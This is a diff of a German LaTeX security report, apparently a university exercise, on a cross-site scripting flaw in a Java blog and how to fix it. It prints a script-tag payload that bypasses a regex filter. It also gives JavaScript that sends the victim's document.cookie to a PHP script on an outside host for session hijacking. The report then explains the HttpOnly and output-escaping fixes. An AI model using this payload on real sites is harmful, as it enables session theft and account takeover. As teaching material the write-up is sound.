@@ -4,6 +4,8 @@
 
 Das Blog ist anfällig für Cross-Site Scripting. Das Problem liegt darin, dass die Eingabedaten beim Erzeugen eines neuen Blog-Eintrags nur unzureichend gefiltert werden. Beim erneuten Anzeigen eines betroffenen Blog-Eintrags werden diese Daten - die z. B. beliebigen JavaScript-Code enthalten können - dann an den Browsers gesendet und dort ausgeführt.
 
+\subsubsection{Ein harmloses Beispiel}
+
 Ein konkretes Beispiel für einen Angriff: Der Angreifer \emph{evil\_hacker} legt einen neuen Blog-Eintrag an. Im Formular auf \url{newPost.html} gibt er als Benutzernamen wahrheitsgemäß \lstinline$evil_hacker$ ein. Als Text des Blog-Eintrags wählt er \lstinline$<SCRIPT SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js></SCRIPT>$.
 
 Im Servlet, das den Post-Request entgegen nimmt (\url{gui.controller.BlogServlet}) wird die Eingabe zwar validiert, bevor sie in die (In-Memory-)Datenbank geschrieben wird. Leider ist der verwendete Validator (\url{gui.helper.ScriptTagValidator}) nicht ausreichend. Die verwendete Regular Expression \lstinline$.*< *[Ss][Cc][Rr][Ii][Pp][Tt] *>.*"$ matcht nur Script-Tags, die keine Attribute zwischen dem Wort "script" und der schließenden Spitz-Klammer enthalten. Durch die Angabe \lstinline$SRC=http://web.student.tuwien.ac.at/~e9902433/xss.js$ lässt sich der Validator also in die Irre führen und lässt die Eingabe ungefiltert durch.
@@ -16,15 +18,71 @@ document.write('This is the evil script!')
 
 Da bei der Ausgabe der Blog-Einträge die Inhalte überhaupt nicht mehr gefiltert werden, wird also der folgende Text als Blog-Eintrag wieder ausgegeben (z. B. in archive.jsp). Im Browser wird das Script-Tag dann so behandelt, als würde es aus vertrauenswürdiger Quelle kommen: Das Script von der angegebenen URL wird heruntergeladenen und ausgeführt. Im konkreten Fall wird dadurch an der Stelle, an der sich das Script-Tag befand der Text "This is the evil script" ausgegeben. (Der Vollständigkeit halber soll darauf hinwiesen werden, dass der Angriff auch funktionieren würde, wenn der Angreifer das Script-Tag als Autoren-Namen und nicht als Blog-Text eingegeben hätte, da diese beiden Werte auf exakt dieselbe Art behandelt werden.)
 
-Im vorliegenden Fall handelt es sich natürlich nur um einen harmlosen "Spass" - schließlich hätte der Angreifer ja auch gleich "This is the evil script" als Blog-Text eintragen können. Und da das Blog über nur einen sehr eingeschränkten Funktionsumfang verfügt, gibt es auch nicht viel zu zerstören oder auszuspionieren. Lediglich die Session-ID, welche in einem Cookie abgespeichert wird, stellt ein mögliches Ziel für tatsächlich gefährliche Angriffe dar.
+Im vorliegenden Fall handelt es sich natürlich nur um einen harmlosen "Spass" - schließlich hätte der Angreifer ja auch gleich "This is the evil script" als Blog-Text eintragen können. Und da das Blog über nur einen sehr eingeschränkten Funktionsumfang verfügt, gibt es auch nicht viel zu zerstören oder auszuspionieren. Lediglich die Session-ID, welche in einem Cookie abgespeichert wird, stellt ein mögliches Ziel für tatsächlich gefährliche Angriffe dar - nämlich für einen sogenannten Session Hijacking-Angriff.
 
-Ein entsprechendes JavaScript könnte diese SessionID auslesen und an den Server des Angreifers übermitteln - dieser hätte dann über die SessionID Zugriff auf die Session des Opfers. Die Website könnte dann nicht mehr zwischen dem Opfer und dem Angreifer unterscheiden und der Angreifer hätte Zugriff auf eventuell gespeicherte private Daten des Opfers, etc.
+\subsubsection{Tatsächlicher Angriff: Session Hijacking}
 
-Allerdings ist die SessionID im Cookie als "HttpOnly" gekennzeichnet. Dies ist ein Hinweis für den Browser, dass dieser Wert einem clientseitigen Script nicht zugänglich gemacht werden darf. Moderne Browser verstehen diese Hinweis und schützen daher die SessionID vor dem oben beschriebenen Session Hijacking-Angriff. Verwendet der User allerdings einen älteren Browser, ist es denkbar, dass dieser den Hinweis "HttpOnly" nicht versteht und daher die SessionID einem Script zugänglich macht. Ein Session Hijacking wäre damit also denkbar.
+Nehmen wir, der Angreifer erweitert sein Script, und fügt dabei zwei Befehle hinzu, die den Inhalt des Cookies an ein Skript auf dem Webserver des Angreifers schicken (zu Demonstrationszwecken gibt das Skript den Inhalt des Cookies auch noch als Teil der Website aus):
 
-\subsection{Lösung: Escapen beim erneuten Anzeigen}
+\begin{lstlisting}
+document.write('This is the evil script!');
+
+document.write('Cookie contents: ' + escape(document.cookie));
+document.write('<img src=\'http://web.student.tuwien.ac.at/~e9902433/steal_the_sessionID.php?s='+escape(document.cookie)+'\' />');
+\end{lstlisting}
+
+Das Skript \url{steal_the_sessionID.php} kann dann die SessionID aus dem Cookie extrahieren und der Angreifer hätte dann über die SessionID Zugriff auf die Session des Opfers. Die Website könnte dann nicht mehr zwischen dem Opfer und dem Angreifer unterscheiden und der Angreifer hätte Zugriff auf eventuell gespeicherte private Daten des Opfers, etc.
+
+\subsubsection{HttpOnly?}
+
+Seit einigen Jahren existiert gegen diese Art des Angriffs eine Sicherheitsvorkehrung, die das Stehlen von Cookie-Daten verhindern soll. Beim Setzen des Cookies kann der Webserver diesen als "HttpOnly" kennzeichnen. Dies ist ein Hinweis für den Browser, dass dieser Wert einem clientseitigen Script nicht zugänglich gemacht werden darf. Moderne Browser verstehen diese Hinweis und schützen daher die SessionID vor dem oben beschriebenen Session Hijacking-Angriff.
+
+In der \url{README}-Datei unseres Java-Blogs wird behauptet, die Cookies wären als "HttpOnly" gekennzeichnet. Ein Blick in die Server-Konfigurations-Datei \url{web.xml} zeigt jedoch das Gegenteil. Diese Datei enthält unter anderem den folgenden Abschnitt:
+
+\begin{lstlisting}
+<session-config>
+	<cookie-config>
+		<http-only>
+			false
+		</http-only>
+	</cookie-config>
+</session-config>
+\end{lstlisting}
+
+Ganz eindeutig sind die Cookies also nicht als HttpOnly gekennzeichnet. Im Rahmen eines Cross-Site Scriptings Angriffs wäre es dem Angreifer also möglich, den Cookie auszulesen und die SessionID zu stehlen.
+
+Zusammenfassend konnten in diesem Blog-Programm also zwei Sicherheitslücken identifiziert werden:
+
+\begin{enumerate}
+\item Eine Anfälligkeit für Cross-Site Scripting
+\item Cookies sind nicht vor dem Zugriff durch clientseitige Skripts geschützt
+\end{enumerate}
+
+Der folgende Abschnitt beschreibt Möglichkeiten, diese Sicherheitslücken zu schließen.
+
+\subsection{Lösung - Teil 1: HttpOnly}
+
+Der erste und einfachste Teil der Lösung besteht darin, die Cookies tatsächlich als HttpOnly zu konfigurieren. Dafür der oben gezeigt Ausschnitt aus web.xml folgendermaßen angepasst werden:
+
+\begin{lstlisting}
+<session-config>
+	<cookie-config>
+		<http-only>
+			true
+		</http-only>
+	</cookie-config>
+</session-config>
+\end{lstlisting}
+
+Die Cookies so zu schützen ist sinnvoll, aber nicht ausreichend. Verwendet der User nämlich einen älteren Browser, ist es denkbar, dass dieser den Hinweis "HttpOnly" nicht versteht und daher die SessionID einem Script zugänglich macht. Ein Session Hijacking wäre damit also denkbar. Daher ist es notwendig, auch die Anfälligkeit gegen Cross-Site Scripting zu beheben.
+
+\subsection{Lösung - Teil 2: Schutz gegen Cross-Site Scripting}
+
+\subsubsection{Bessere Regular Expressions?}
 
 Ein erster Versuch, das Programm sicherer zu machen, wäre, die Regular Expression anzupassen, so dass auch Script-Tags mit einem src-Attribut als gefährlich erkannt und ausgefilter würden. Also z. B. \lstinline$.*< *[Ss][Cc][Rr][Ii][Pp][Tt] *([Ss][Rr][Cc].*)+>.*"$. Dies ist allerdings fehleranfällig und lässt außerdem andere Möglichkeiten des Cross-Site Scripting außer Acht.
+
+\subsubsection{Besser: Escapen beim erneuten Anzeigen}
 
 Die einfachste Lösung, um Cross-Site Scripting in diesem konkreten Fall vorzubeugen, liegt darin, die Blog-Daten (Autoren und Inhalte) nicht bei der Eingabe, sondern erst bei der Ausgabe zu filtern. Anders als z. B. bei Formen der SQL-Injection ist der Code im Rahmen eines Cross-Site Scripting Angriffs erst dann gefährlich, wenn er wieder an einen Browser ausgegeben wird. Da auf dem Server kein HTML nach Script-Tags geparst und kein JavaScript interpretiert wird, ist z. B. der oben gezeigt Angriff für den Server ungefährlich.
 
